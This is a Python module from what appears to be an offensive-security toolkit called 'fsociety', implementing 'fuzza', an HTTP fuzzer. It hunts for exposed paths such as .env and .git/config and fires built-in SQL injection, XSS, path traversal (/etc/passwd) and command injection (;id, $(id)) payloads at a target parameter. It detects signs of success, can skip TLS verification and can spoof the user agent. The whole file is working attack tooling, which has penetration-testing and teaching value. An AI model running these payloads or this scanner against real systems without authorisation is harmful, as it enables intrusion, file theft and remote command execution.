from __future__ import annotations

import http.client
import random
import ssl
import string
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from typing import Iterable

from fsociety.core.base import tool
from fsociety.core.logger import Log

COMMON_PATHS = [
    "admin", "login", "wp-admin", "wp-login.php", ".git/config", ".env",
    "robots.txt", "sitemap.xml", "api", "api/v1", "api/v2", "graphql",
    "backup", "backups", "config", "config.php", "phpinfo.php", "info.php",
    "server-status", "actuator", "actuator/health", "debug", "console",
    "adminer.php", "db.php", "upload", "uploads", "files", "static",
    ".htaccess", ".DS_Store", "crossdomain.xml", "swagger.json", "openapi.json",
    "vendor", "test", "tests", "dev", "staging", "private", "internal",
]

SQLI_PAYLOADS = ["'", "\"", "1' OR '1'='1", "' OR 1=1--", "' UNION SELECT NULL--",
                 "\" OR \"\"=\"", "1 AND 1=2", "'; WAITFOR DELAY '0:0:5'--"]
XSS_PAYLOADS = ["<script>alert(1)</script>", "\"><svg/onload=alert(1)>",
                "javascript:alert(1)", "'-alert(1)-'", "<img src=x onerror=alert(1)>"]
TRAVERSAL_PAYLOADS = ["../../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd",
                      "....//....//etc/passwd", "%2e%2e%2f%2e%2e%2fetc%2fpasswd"]
CMD_PAYLOADS = [";id", "|id", "`id`", "$(id)", "&&id", "||id", "%3Bid"]

@tool("fuzza", "HTTP endpoint fuzzer: paths, params, injection classes", category="fuzzing")
class Fuzza:
    @staticmethod
    def build_parser(p):
        p.add_argument("url", help="target base URL, e.g. https://host/")
        p.add_argument("-w", "--wordlist", help="wordlist file for paths")
        p.add_argument("-t", "--threads", type=int, default=10)
        p.add_argument("--timeout", type=float, default=8.0)
        p.add_argument("--status", default="200,204,301,302,307,401,403,405",
                       help="status codes treated as interesting")
        p.add_argument("--show-body", action="store_true", help="preview response bodies")
        p.add_argument("--body-length", type=int, default=80)
        p.add_argument("--param", help="parameter name to fuzz for injection")
        p.add_argument("--inject", choices=["sqli", "xss", "traversal", "cmdi", "all"],
                       default="all")
        p.add_argument("--paths", action="store_true", help="fuzz paths")
        p.add_argument("--insecure", action="store_true", help="skip TLS verification")
        p.add_argument("-o", "--out", help="save hits to file")
        p.add_argument("--random-agent", action="store_true")

    @staticmethod
    def _ctx(insecure: bool):
        if insecure:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            return ctx
        return ssl.create_default_context()

    @staticmethod
    def _request(base: str, path: str, timeout: float, ctx, ua: str):
        parsed = urllib.parse.urlparse(base)
        scheme = parsed.scheme or "http"
        host = parsed.hostname
        port = parsed.port or (443 if scheme == "https" else 80)
        prefix = parsed.path.rstrip("/")
        target = f"{prefix}/{path.lstrip('/')}" if prefix else f"/{path.lstrip('/')}"
        if scheme == "https":
            conn = http.client.HTTPSConnection(host, port, timeout=timeout, context=ctx)
        else:
            conn = http.client.HTTPConnection(host, port, timeout=timeout)
        try:
            conn.request("GET", target, headers={"User-Agent": ua})
            resp = conn.getresponse()
            body = resp.read(8192)
            return resp.status, len(body), body
        except (http.client.HTTPException, OSError, ssl.SSLError) as exc:
            return None, 0, str(exc).encode()
        finally:
            conn.close()

    @staticmethod
    def _payloads(kind: str) -> list[tuple[str, str]]:
        if kind == "sqli":
            return [("sqli", p) for p in SQLI_PAYLOADS]
        if kind == "xss":
            return [("xss", p) for p in XSS_PAYLOADS]
        if kind == "traversal":
            return [("traversal", p) for p in TRAVERSAL_PAYLOADS]
        if kind == "cmdi":
            return [("cmdi", p) for p in CMD_PAYLOADS]
        return ([("sqli", p) for p in SQLI_PAYLOADS] +
                [("xss", p) for p in XSS_PAYLOADS] +
                [("traversal", p) for p in TRAVERSAL_PAYLOADS] +
                [("cmdi", p) for p in CMD_PAYLOADS])

    @staticmethod
    def _random_ua() -> str:
        return (f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                f"(KHTML, like Gecko) Chrome/{random.randint(90, 124)}.0."
                f"{random.randint(1000, 9999)}.{random.randint(0, 200)} Safari/537.36")

    @staticmethod
    def _param_url(base: str, param: str, value: str) -> str:
        sep = "&" if "?" in base else "?"
        return f"{base}{sep}{urllib.parse.quote(param)}={urllib.parse.quote(value, safe='')}"

    @staticmethod
    def run(args, log: Log) -> int:
        ctx = Fuzza._ctx(args.insecure)
        ua = Fuzza._random_ua() if args.random_agent else "fsociety-fuzza/1.0"
        interesting = {int(s) for s in args.status.split(",") if s.strip().isdigit()}
        hits: list[dict] = []

        if args.paths or not args.param:
            words = COMMON_PATHS
            if args.wordlist:
                words = [w.strip() for w in Path(args.wordlist).read_text().splitlines() if w.strip()]
            log.info(f"path fuzz: {len(words)} word(s)")

            def probe(word: str):
                status, length, body = Fuzza._request(args.url, word, args.timeout, ctx, ua)
                return word, status, length, body

            with ThreadPoolExecutor(max_workers=max(1, args.threads)) as ex:
                futures = {ex.submit(probe, w): w for w in words}
                for fut in as_completed(futures):
                    word, status, length, body = fut.result()
                    if status in interesting:
                        rec = {"type": "path", "path": word, "status": status,
                               "length": length,
                               "preview": body[:args.body_length].decode("latin-1") if args.show_body else ""}
                        hits.append(rec)
                        log.hit(f"[{status}] /{word} ({length}B)")

        if args.param:
            payloads = Fuzza._payloads(args.inject)
            log.info(f"param fuzz: {args.param} ({len(payloads)} payload(s))")

            def probe_payload(item):
                kind, payload = item
                url = Fuzza._param_url(args.url, args.param, payload)
                started = time.time()
                status, length, body = Fuzza._request(url, "", args.timeout, ctx, ua)
                elapsed = (time.time() - started) * 1000
                return kind, payload, status, length, body, elapsed

            with ThreadPoolExecutor(max_workers=max(1, args.threads)) as ex:
                futures = [ex.submit(probe_payload, pl) for pl in payloads]
                for fut in as_completed(futures):
                    kind, payload, status, length, body, elapsed = fut.result()
                    text = body.decode("latin-1", "ignore") if isinstance(body, bytes) else ""
                    flag = ""
                    if kind == "sqli" and any(tok in text.lower() for tok in
                                              ("sql syntax", "mysql", "you have an error",
                                               "sqlite", "postgres", "ora-")):
                        flag = "sql-error"
                    elif kind == "xss" and payload in text:
                        flag = "reflected"
                    elif kind == "traversal" and "root:x:" in text:
                        flag = "file-read"
                    elif kind == "cmdi" and ("uid=" in text and "gid=" in text):
                        flag = "cmd-exec"
                    if flag:
                        rec = {"type": "inject", "class": kind, "payload": payload,
                               "status": status, "length": length, "signal": flag,
                               "ms": round(elapsed, 1)}
                        hits.append(rec)
                        log.hit(f"{kind} {flag} -> {payload!r}")

        if args.out and hits:
            Path(args.out).write_text("\n".join(
                f"{h.get('type')}\t{h.get('path') or h.get('class')}\t{h.get('payload','')}\t{h.get('status')}"
                for h in hits
            ), encoding="utf-8")
            log.ok(f"{len(hits)} hit(s) -> {args.out}")
        else:
            log.ok(f"{len(hits)} hit(s)")
        return 0 if hits else 1
